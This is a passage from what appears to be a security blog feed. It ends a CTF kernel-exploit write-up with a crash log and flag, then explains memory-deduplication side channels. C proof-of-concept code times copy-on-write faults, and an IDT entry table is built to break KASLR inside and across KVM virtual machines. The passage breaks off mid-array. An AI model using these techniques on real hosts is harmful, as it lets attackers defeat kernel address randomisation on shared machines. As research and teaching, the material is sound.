[   93.400051] CR2: 00007ffc83709fe4 CR3: 0000000100ac8005 CR4: 0000000000770ef0
[   93.400469] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.400881] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.401295] PKRU: 55555554
[   93.401457] note: exploit[85] exited with irqs disabled
[   93.402397] ------------[ cut here ]------------
[   93.402683] WARNING: CPU: 0 PID: 30 at kernel/ucount.c:285 dec_rlimit_ucounts+0x4f/0x60
[   93.403149] Modules linked in:
[   93.403341] CPU: 0 PID: 30 Comm: kworker/u2:2 Tainted: G      D            6.3.4 #14
[   93.403797] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[   93.404358] Workqueue: events_unbound call_usermodehelper_exec_work
[   93.404727] RIP: 0010:dec_rlimit_ucounts+0x4f/0x60
[   93.405014] Code: c1 04 31 48 29 d0 78 22 48 39 cf 4c 0f 44 c0 48 8b 41 10 48 8b 88 e0 01 00 00 48 85 c9 75 db 4d 85 c0 0f 94 c0 c3 cc cc cc cc &lt;0f&gt; 0b eb da 31 c0 c3 cc cc cc cc 66 0f 1f 44 00 00 90 90 90 90 90
[   93.406089] RSP: 0018:ffffa71340107d00 EFLAGS: 00010297
[   93.406404] RAX: ffffffffffffffff RBX: ffffa71340107e08 RCX: ffffffffb6c3b6c0
[   93.406820] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffffb6c3b6c0
[   93.407240] RBP: ffff8d9100c442c0 R08: ffffffffffffffff R09: ffffffffffffffff
[   93.407651] R10: 00000000000000ba R11: 00000000000009e8 R12: ffffffffb6c3b6c0
[   93.408065] R13: 0000000000000010 R14: dead000000000122 R15: 0000000000000000
[   93.408482] FS:  0000000000000000(0000) GS:ffff8d913bc00000(0000) knlGS:0000000000000000
[   93.408947] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.409288] CR2: 000000000065eff0 CR3: 000000004222c006 CR4: 0000000000770ef0
[   93.409709] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.410125] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.410541] PKRU: 55555554
[   93.410708] Call Trace:
[   93.410862]  &lt;TASK&gt;
[   93.410992]  release_task+0x47/0x4b0
[   93.411217]  ? thread_group_cputime_adjusted+0x46/0x70
[   93.411522]  wait_consider_task+0x90d/0x9e0
[   93.411770]  do_wait+0x17b/0x2c0
[   93.411966]  kernel_wait+0x44/0x90
[   93.412175]  ? __pfx_child_wait_callback+0x10/0x10
[   93.412461]  call_usermodehelper_exec_work+0x72/0x80
[   93.412754]  process_one_work+0x1b1/0x340
[   93.412994]  worker_thread+0x45/0x3b0
[   93.413219]  ? __pfx_worker_thread+0x10/0x10
[   93.413473]  kthread+0xd1/0x100
[   93.413659]  ? __pfx_kthread+0x10/0x10
[   93.413883]  ret_from_fork+0x29/0x50
[   93.414103]  &lt;/TASK&gt;
[   93.414238] ---[ end trace 0000000000000000 ]---
/tmp/bad: line 1: : not found
corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG AS PEr sPeCiFIcaTionS anD ThIS BEHavioR Is cORRecTly documEnteD IN tHE INTEL SofTwArE DEvELOPErs manual.}
</code></pre></div></div>

<p>After a few runs the prefetch attacks succeeded and the exploit worked! flag!</p>

<h2 id="closing">closing</h2>

<p>This challenge was awesome, I had been hoping someone would create a challenge around the sysret bug ever since I learned about it. So, thanks to FizzBuzz101 for creating this challenge!</p>

<style>
.caption {
  text-align: center;
  font-size: .8rem !important;
  color: lightgrey;
}
</style>]]></content><author><name>Justin Miller</name></author><category term="Exploitation" /><category term="Sidechannels" /><category term="Linux" /><category term="CTF Writeup" /><summary type="html"><![CDATA[I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!]]></summary></entry><entry><title type="html">Understanding Memory Deduplication Attacks</title><link href="https://zolutal.github.io/dedup-attacks/" rel="alternate" type="text/html" title="Understanding Memory Deduplication Attacks" /><published>2023-06-17T00:00:00+00:00</published><updated>2023-06-17T00:00:00+00:00</updated><id>https://zolutal.github.io/dedup-attacks</id><content type="html" xml:base="https://zolutal.github.io/dedup-attacks/"><![CDATA[<p>I recently came across a bunch of research describing attacks on memory deduplication, it has been used to fingerprint systems[1], crack (K)ASLR[2,3,4], leak database records[4], and even exploit rowhammer[5]. It’s a really cool class of attacks that I hadn’t heard of before, but I wasn’t having much luck finding any POCs for these attacks… So, I figured I’d write up what I learned about how these attacks work and write my own version of one of these attacks that can be used break KASLR in KVM for the current VM as well as across VMs.</p>

<p><em>The ability to break KASLR across VMs while also bypassing KPTI using deduplication was discovered by the authors of [3], I will just be exploring the basis for these attacks and writing my own attack based on their research.</em></p>

<p>A repository of the code examples associated with this post can be found here: <a href="https://github.com/zolutal/dedup-attacks">github.com/zolutal/dedup-attacks</a></p>

<h2 id="wtf-is-deduplication">wtf is deduplication</h2>

<p>Memory deduplication is an optimization to reduce the amount of memory being used on a system. The idea being that similar processes are likely to have similar memory contents, so by pointing pages of memory that have the same content to the same physical address and marking them copy-on-write a large amount of memory can be saved.</p>

<p>Linux implements this via Kernel Same-Page Merging (KSM), which as the name implies “merges” pages with the same content by pointing them to the same physical memory. KSM will run periodically on a configurable interval, scanning a number of pages everytime for identical contents to merge.</p>

<p>Note that KSM may not be enabled by default, though it was enabled on both of my Ubuntu 22.04 machines. Also, not every page is mergable, on Linux pages are only mergable if they are explicitly marked as mergable, e.g. using madvise with MADV_MERGABLE.</p>

<p>Documentation regarding how to enable and configure KSM is located here: <a href="https://www.kernel.org/doc/html/v6.3/admin-guide/mm/ksm.html">Kernel Samepage Merging</a></p>

<p>For reference, this was the default configuration for KSM on my Ubuntu machine:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/sys/kernel/mm/ksm/run:1
/sys/kernel/mm/ksm/stable_node_chains_prune_millisecs:2000
/sys/kernel/mm/ksm/merge_across_nodes:1
/sys/kernel/mm/ksm/use_zero_pages:0
/sys/kernel/mm/ksm/pages_to_scan:100
/sys/kernel/mm/ksm/sleep_millisecs:200
/sys/kernel/mm/ksm/use_zero_pages:0
</code></pre></div></div>

<h2 id="observing-deduplication">observing deduplication</h2>

<p>As mentioned, when a page is merged it is made copy-on-write (CoW), in short this just means that it’s access permissions are set to be not writeable (write-protected) so that a page fault will occur if it is written to. When the kernel sees that a page fault occurred from an attempt to write to a copy-on-write page, it will copy the contents of the page to a newly allocated page and perform the write operation on the new page.</p>

<p>So if we have a page that got deduplicated and we write to it, a page fault will occur. The page fault will have to be handled by the kernel which will have to identify the page fault was a write to a copy-on-write page, allocate a new page, copy the contents of the old page to the new one, and perform the write again all before returning to userspace. That’s a whole lot of stuff to do which will take way longer than a non-faulting memory write, meaning we can easily use a timer to record whether or not a write was a faulting one allowing us to detect if deduplication occurred on a given page.</p>

<h3 id="timing-page-faults">timing page faults</h3>

<p>Then the first step in exploiting deduplication is being able to detect when a page fault ocurrs. A simple way to demonstrate page fault detection is by using memory allocated using mmap. On Linux, the default behavior of mmap is to not immediately allocate the memory that is requested. This is because Linux implements demand paging, so pages aren’t allocated memory until they are first accessed. We can see this from the example below.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// write a null byte to addr</span>
<span class="kt">void</span> <span class="nf">poke</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> <span class="p">}</span>

<span class="c1">// return the difference in the processor's timestamp before and after poke</span>
<span class="kt">uint64_t</span> <span class="nf">time_poke</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">start</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
    <span class="n">poke</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">end</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
    <span class="k">return</span> <span class="n">end</span><span class="o">-</span><span class="n">start</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// allocate a single read/write anon/private page</span>
<span class="kt">void</span> <span class="o">*</span><span class="nf">alloc_page</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANON</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>

    <span class="c1">// demonstrates that faulting accesses have distinct timings</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"fault     : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">page</span><span class="p">));</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"post-fault: %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">page</span><span class="p">));</span>
<span class="p">}</span></code></pre></figure>

<p>The timer isn’t particularly precise but it doesn’t really need to be because of how long page faults take, here is what I get running this code:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fault     : 7290 cycles
post-fault: 108 cycles
</code></pre></div></div>

<p>Notice the first access took way longer, this is because as described previously the page wasn’t actually allocated until I attempted to access it. So when I wrote to it by calling poke a page fault occurred resulting in the kernel allocating memory for the page. Now when the second poke is timed the page is already allocated so the access occurs way faster and without a fault.</p>

<h3 id="timing-un-merging">timing un-merging</h3>

<p>Cool! So now let’s try to replicate this with madvise with MADV_MERGABLE.</p>

<p>Pretty similar same setup besides the madvise and additional writes, just now we let the pages get merged and time the copy-on-write page fault instead of the demand paging page fault.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">...</span>
<span class="c1">// read a byte from addr</span>
<span class="kt">void</span> <span class="nf">maccess</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span> <span class="k">volatile</span> <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span> <span class="p">}</span>

<span class="c1">// time maccess using the processor timestamp</span>
<span class="kt">uint64_t</span> <span class="nf">time_access</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">start</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
    <span class="n">maccess</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">end</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
    <span class="k">return</span> <span class="n">end</span><span class="o">-</span><span class="n">start</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// allocate victim and attacker pages</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">victim</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">attacker</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>

    <span class="c1">// mark both pages as mergable</span>
    <span class="n">madvise</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">MADV_MERGEABLE</span><span class="p">);</span>
    <span class="n">madvise</span><span class="p">(</span><span class="n">attacker</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">MADV_MERGEABLE</span><span class="p">);</span>

    <span class="c1">// write something unique to both pages so they aren't merged with</span>
    <span class="c1">// other pages, this also faults them to be sure they are allocated</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">victim</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">attacker</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"sleeping to wait for merge...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"finished sleeping... checking access times</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"read  : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_access</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"write : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"write : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>And here is what the output looks like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sleeping to wait for merge...
finished sleeping... checking access times
read  : 54 cycles
write : 96768 cycles
write : 54 cycles
</code></pre></div></div>

<p>The initial read is quick, meaning the page is present and hasn’t been swapped out or anything, but then the first write is extremely slow while the second write is quick. This result indicates that a page fault occurred on the first write due to the page having been merged, and the difference in timing for the pagefault was extremely distinct. So that now we know that we can observe memory deduplication let’s look at how to exploit it.</p>

<h2 id="targeting-kvm">targeting KVM</h2>

<p>Kernel Samepage Merging was originally designed with KVM in mind[7]. Though madvise exposes it to any application, KVM is still its main user and if it is enabled on the system qemu will use it by default.</p>

<h3 id="making-sure-ksm-is-enabled-for-kvm">making sure KSM is enabled for KVM</h3>

<p>To check if KSM is enabled on a system check the contents of /sys/kernel/mm/ksm/run, if this is set to ‘1’ then KSM is enabled.</p>

<p>To check if KSM is enabled for qemu using KVM check the contents of /etc/default/qemu-kvm, if this is set to ‘AUTO’ or ‘1’ then memory for qemu VMs that use KVM will be made mergeable.</p>

<h3 id="observing-deduplication-in-kvm">observing deduplication in KVM</h3>

<p>Let’s confirm that deduplication is detectable in KVM with a similar setup. I booted up a Linux VM using qemu-system-x86_64 with ‘–enable-kvm’ and ‘-cpu host’ specified, and ran the following code.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// allocate victim and attacker pages</span>
<span class="kt">void</span> <span class="o">*</span><span class="n">victim</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
<span class="kt">void</span> <span class="o">*</span><span class="n">attacker</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>

<span class="c1">// write something unique to both pages so they aren't merged with</span>
<span class="c1">// other zero pages, this also faults them to be sure they are allocated</span>
<span class="n">memset</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">victim</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">memset</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">attacker</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>

<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"sleeping to wait for merge...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"finished sleeping... checking access times</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="c1">// make sure attacker is present and in cache</span>
    <span class="n">time_access</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"write : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"write : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
<span class="p">}</span></code></pre></figure>

<p>The only major differences between this test and the previous, aside from being inside a VM, are that the pages are no longer being marked mergeable using madvise, and the timing is wrapped in a loop (because the merging takes a bit longer with the amount of memory a VM uses).</p>

<p>Here is an example of the output from this test:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
sleeping to wait for merge...
finished sleeping... checking access times
write : 81 cycles
write : 81 cycles
sleeping to wait for merge...
finished sleeping... checking access times
write : 55242 cycles
write : 54 cycles
...
</code></pre></div></div>

<p>So without even marking either of these pages as mergeable, we can see that deduplication occurred!</p>

<p>But this isn’t very interesting yet, all we’ve done is show that we can see our own memory get merged together…</p>

<h3 id="breaking-kaslr">breaking KASLR</h3>

<p>So how can we break KASLR using memory deduplication?</p>

<p>The article describing this attack[2] targets relocations, the idea being that a number of instructions have to be adjusted after the kernel is rebased by KASLR, if we can find some code pages with only a few relocations then only the relocated instructions will differ between boot and leaking the relocated instructions will mean breaking KASLR. So if we just mmap a page in userspace with the contents of a kernel code page and bruteforce the relocations until merging occurs, we should have our leak!</p>

<p>Except that sounds kind of annoying, adjusting relocations in C? maybe it isn’t actually <em>that</em> bad but I’d rather not… so I’ll target something else that’s a little more structured instead: the IDT.</p>

<p>The Interrupt Descriptor Table (IDT) is a decent target for this attack because it is full of entries that represent interrupt entry points, the entries only vary per boot by KASLR affecting what address they will point to. This makes the entries relatively easy to generate, I can just boot the VM, dump the IDT to collect the first qword of the each entry, rebase them to according to the lowest possible virtual address for the kernel to be located, and stick them into an array. I’ll include a script I wrote in the repo that makes generating this array easy.</p>

<p>For an IDT with entries that look like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/16gx 0xfffffe0000000000
0xfffffe0000000000:	0x88808e0000100920	0x00000000ffffffff
0xfffffe0000000010:	0x88808e0300100c40	0x00000000ffffffff
0xfffffe0000000020:	0x88808e0200101680	0x00000000ffffffff
0xfffffe0000000030:	0x8880ee0000100b30	0x00000000ffffffff
0xfffffe0000000040:	0x8880ee0000100940	0x00000000ffffffff
0xfffffe0000000050:	0x88808e0000100960	0x00000000ffffffff
0xfffffe0000000060:	0x88808e0000100b10	0x00000000ffffffff
0xfffffe0000000070:	0x88808e0000100980	0x00000000ffffffff
</code></pre></div></div>

<p>I end up with an array that looks like this:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">uint64_t</span> <span class="n">entries</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x81208e0000100920</span><span class="p">,</span> <span class="mh">0x81208e0300100c40</span><span class="p">,</span> <span class="mh">0x81208e0200101680</span><span class="p">,</span> <span class="mh">0x8120ee0000100b30</span><span class="p">,</span> <span class="mh">0x8120ee0000100940</span><span class="p">,</span> <span class="mh">0x81208e0000100960</span><span class="p">,</span> <span class="mh">0x81208e0000100b10</span><span class="p">,</span> <span class="mh">0x81208e0000100980</span><span class="p">,</span> <span class="mh">0x81208e0100100ca0</span><span class="p">,</span> <span class="mh">0x81208e00001009a0</span><span class="p">,</span> <span class="mh">0x81208e0000100a20</span><span class="p">,</span> <span class="mh">0x81208e0000100a50</span><span class="p">,</span> <span class="mh">0x81208e0000100a80</span><span class="p">,</span> <span class="mh">0x81208e0000100ab0</span><span class="p">,</span> <span class="mh">0x81208e0000100b70</span><span class="p">,</span> <span class="mh">0x81208e00001009c0</span><span class="p">,</span> <span class="mh">0x81208e00001009e0</span><span class="p">,</span> <span class="mh">0x81208e0000100ae0</span><span class="p">,</span> <span class="mh">0x81208e0400100ba0</span><span class="p">,</span> <span class="mh">0x81208e0000100a00</span><span class="p">,</span> <span class="mh">0x81208e0000100db0</span><span class="p">,</span> <span class="mh">0x82678e000010992d</span><span class="p">,</span> <span class="mh">0x82678e0000109936</span><span class="p">,</span> <span class="mh">0x82678e000010993f</span><span class="p">,</span> <span class="mh">0x82678e0000109948</span><span class="p">,</span> <span class="mh">0x82678e0000109951</span><span class="p">,</span> <span class="mh">0x82678e000010995a</span><span class="p">,</span> <span class="mh">0x82678e0000109963</span><span class="p">,</span> <span class="mh">0x82678e000010996c</span><span class="p">,</span> <span class="mh">0x81208e0500100d00</span><span class="p">,</span> <span class="mh">0x82678e000010997e</span><span class="p">,</span> <span class="mh">0x82678e0000109987</span><span class="p">,</span> <span class="mh">0x81208e0000100f10</span><span class="p">,</span> <span class="mh">0x81208e0000100228</span><span class="p">,</span> <span class="mh">0x81208e0000100230</span><span class="p">,</span> <span class="mh">0x81208e0000100238</span><span class="p">,</span> <span class="mh">0x81208e0000100240</span><span class="p">,</span> <span class="mh">0x81208e0000100248</span><span class="p">,</span> <span class="mh">0x81208e0000100250</span><span class="p">,</span> <span class="mh">0x81208e0000100258</span><span class="p">,</span> <span class="mh">0x81208e0000100260</span><span class="p">,</span> <span class="mh">0x81208e0000100268</span><span class="p">,</span> <span class="mh">0x81208e0000100270</span><span class="p">,</span> <span class="mh">0x81208e0000100278</span><span class="p">,</span> <span class="mh">0x81208e0000100280</span><span class="p">,</span> <span class="mh">0x81208e0000100288</span><span class="p">,</span> <span class="mh">0x81208e0000100290</span><span class="p">,</span> <span class="mh">0x81208e0000100298</span><span class="p">,</span> <span class="mh">0x81208e00001002a0</span><span class="p">,</span> <span class="mh">0x81208e00001002a8</span><span class="p">,</span> <span class="mh">0x81208e00001002b0</span><span class="p">,</span> <span class="mh">0x81208e00001002b8</span><span class="p">,</span> <span class="mh">0x81208e00001002c0</span><span class="p">,</span> <span class="mh">0x81208e00001002c8</span><span class="p">,</span> <span class="mh">0x81208e00001002d0</span><span class="p">,</span> <span class="mh">0x81208e00001002d8</span><span class="p">,</span> <span class="mh">0x81208e00001002e0</span><span class="p">,</span> <span class="mh">0x81208e00001002e8</span><span class="p">,</span> <span class="mh">0x81208e00001002f0</span><span class="p">,</span> <span class="mh">0x81208e00001002f8</span><span class="p">,</span> <span class="mh">0x81208e0000100300</span><span class="p">,</span> <span class="mh">0x81208e0000100308</span><span class="p">,</span> <span class="mh">0x81208e0000100310</span><span class="p">,</span> <span class="mh">0x81208e0000100318</span><span class="p">,</span> <span class="mh">0x81208e0000100320</span><span class="p">,</span> <span class="mh">0x81208e0000100328</span><span class="p">,</span> <span class="mh">0x81208e0000100330</span><span class="p">,</span> <span class="mh">0x81208e0000100338</span><span class="p">,</span> <span class="mh">0x81208e0000100340</span><span class="p">,</span> <span class="mh">0x81208e0000100348</span><span class="p">,</span> <span class="mh">0x81208e0000100350</span><span class="p">,</span> <span class="mh">0x81208e0000100358</span><span class="p">,</span> <span class="mh">0x81208e0000100360</span><span class="p">,</span> <span class="mh">0x81208e0000100368</span><span class="p">,</span> <span class="mh">0x81208e0000100370</span><span class="p">,</span> <span class="mh">0x81208e0000100378</span><span class="p">,</span> <span class="mh">0x81208e0000100380</span><span class="p">,</span> <span class="mh">0x81208e0000100388</span><span class="p">,</span> <span class="mh">0x81208e0000100390</span><span class="p">,</span> <span class="mh">0x81208e0000100398</span><span class="p">,</span> <span class="mh">0x81208e00001003a0</span><span class="p">,</span> <span class="mh">0x81208e00001003a8</span><span class="p">,</span> <span class="mh">0x81208e00001003b0</span><span class="p">,</span> <span class="mh">0x81208e00001003b8</span><span class="p">,</span> <span class="mh">0x81208e00001003c0</span><span class="p">,</span> <span class="mh">0x81208e00001003c8</span><span class="p">,</span> <span class="mh">0x81208e00001003d0</span><span class="p">,</span> <span class="mh">0x81208e00001003d8</span><span class="p">,</span> <span class="mh">0x81208e00001003e0</span><span class="p">,</span> <span class="mh">0x81208e00001003e8</span><span class="p">,</span> <span class="mh">0x81208e00001003f0</span><span class="p">,</span> <span class="mh">0x81208e00001003f8</span><span class="p">,</span> <span class="mh">0x81208e0000100400</span><span class="p">,</span> <span class="mh">0x81208e0000100408</span><span class="p">,</span> <span class="mh">0x81208e0000100410</span><span class="p">,</span> <span class="mh">0x81208e0000100418</span><span class="p">,</span> <span class="mh">0x81208e0000100420</span><span class="p">,</span> <span class="mh">0x81208e0000100428</span><span class="p">,</span> <span class="mh">0x81208e0000100430</span><span class="p">,</span> <span class="mh">0x81208e0000100438</span><span class="p">,</span> <span class="mh">0x81208e0000100440</span><span class="p">,</span> <span class="mh">0x81208e0000100448</span><span class="p">,</span> <span class="mh">0x81208e0000100450</span><span class="p">,</span> <span class="mh">0x81208e0000100458</span><span class="p">,</span> <span class="mh">0x81208e0000100460</span><span class="p">,</span> <span class="mh">0x81208e0000100468</span><span class="p">,</span> <span class="mh">0x81208e0000100470</span><span class="p">,</span> <span class="mh">0x81208e0000100478</span><span class="p">,</span> <span class="mh">0x81208e0000100480</span><span class="p">,</span> <span class="mh">0x81208e0000100488</span><span class="p">,</span> <span class="mh">0x81208e0000100490</span><span class="p">,</span> <span class="mh">0x81208e0000100498</span><span class="p">,</span> <span class="mh">0x81208e00001004a0</span><span class="p">,</span> <span class="mh">0x81208e00001004a8</span><span class="p">,</span> <span class="mh">0x81208e00001004b0</span><span class="p">,</span> <span class="mh">0x81208e00001004b8</span><span class="p">,</span> <span class="mh">0x81208e00001004c0</span><span class="p">,</span> <span class="mh">0x81208e00001004c8</span><span class="p">,</span> <span class="mh">0x81208e00001004d0</span><span class="p">,</span> <span class="mh">0x81208e00001004d8</span><span class="p">,</span> <span class="mh">0x81208e00001004e0</span><span class="p">,</span> <span class="mh">0x81208e00001004e8</span><span class="p">,</span> <span class="mh">0x81208e00001004f0</span><span class="p">,</span> <span class="mh">0x81208e00001004f8</span><span class="p">,</span> <span class="mh">0x81208e0000100500</span><span class="p">,</span> <span class="mh">0x81208e0000100508</span><span class="p">,</span> <span class="mh">0x81208e0000100510</span><span class="p">,</span> <span class="mh">0x81208e0000100518</span><span class="p">,</span> <span class="mh">0x8120ee0000101a80</span><span class="p">,</span> <span class="mh">0x81208e0000100528</span><span class="p">,</span> <span class="mh">0x81208e0000100530</span><span class="p">,</span> <span class="mh">0x81208e0000100538</span><span class="p">,</span> <span class="mh">0x81208e0000100540</span><span class="p">,</span> <span class="mh">0x81208e0000100548</span><span class="p">,</span> <span class="mh">0x81208e0000100550</span><span class="p">,</span> <span class="mh">0x81208e0000100558</span><span class="p">,</span> <span class="mh">0x81208e0000100560</span><span class="p">,</span> <span class="mh">0x81208e0000100568</span><span class="p">,</span> <span class="mh">0x81208e0000100570</span><span class="p">,</span> <span class="mh">0x81208e0000100578</span><span class="p">,</span> <span class="mh">0x81208e0000100580</span><span class="p">,</span> <span class="mh">0x81208e0000100588</span><span class="p">,</span> <span class="mh">0x81208e0000100590</span><span class="p">,</span> <span class="mh">0x81208e0000100598</span><span class="p">,</span> <span class="mh">0x81208e00001005a0</span><span class="p">,</span> <span class="mh">0x81208e00001005a8</span><span class="p">,</span> <span class="mh">0x81208e00001005b0</span><span class="p">,</span> <span class="mh">0x81208e00001005b8</span><span class="p">,</span> <span class="mh">0x81208e00001005c0</span><span class="p">,</span> <span class="mh">0x81208e00001005c8</span><span class="p">,</span> <span class="mh">0x81208e00001005d0</span><span class="p">,</span> <span class="mh">0x81208e00001005d8</span><span class="p">,</span> <span class="mh">0x81208e00001005e0</span><span class="p">,</span> <span class="mh">0x81208e00001005e8</span><span class="p">,</span> <span class="mh">0x81208e00001005f0</span><span class="p">,</span> <span class="mh">0x81208e00001005f8</span><span class="p">,</span> <span class="mh">0x81208e0000100600</span><span class="p">,</span> <span class="mh">0x81208e0000100608</span><span class="p">,</span> <span class="mh">0x81208e0000100610</span><span class="p">,</span> <span class="mh">0x81208e0000100618</span><span class="p">,</span> <span class="mh">0x81208e0000100620</span><span class="p">,</span> <span class="mh">0x81208e0000100628</span><span class="p">,</span> <span class="mh">0x81208e0000100630</span><span class="p">,</span> <span class="mh">0x81208e0000100638</span><span class="p">,</span> <span class="mh">0x81208e0000100640</span><span class="p">,</span> <span class="mh">0x81208e0000100648</span><span class="p">,</span> <span class="mh">0x81208e0000100650</span><span class="p">,</span> <span class="mh">0x81208e0000100658</span><span class="p">,</span> <span class="mh">0x81208e0000100660</span><span class="p">,</span> <span class="mh">0x81208e0000100668</span><span class="p">,</span> <span class="mh">0x81208e0000100670</span><span class="p">,</span> <span class="mh">0x81208e0000100678</span><span class="p">,</span> <span class="mh">0x81208e0000100680</span><span class="p">,</span> <span class="mh">0x81208e0000100688</span><span class="p">,</span> <span 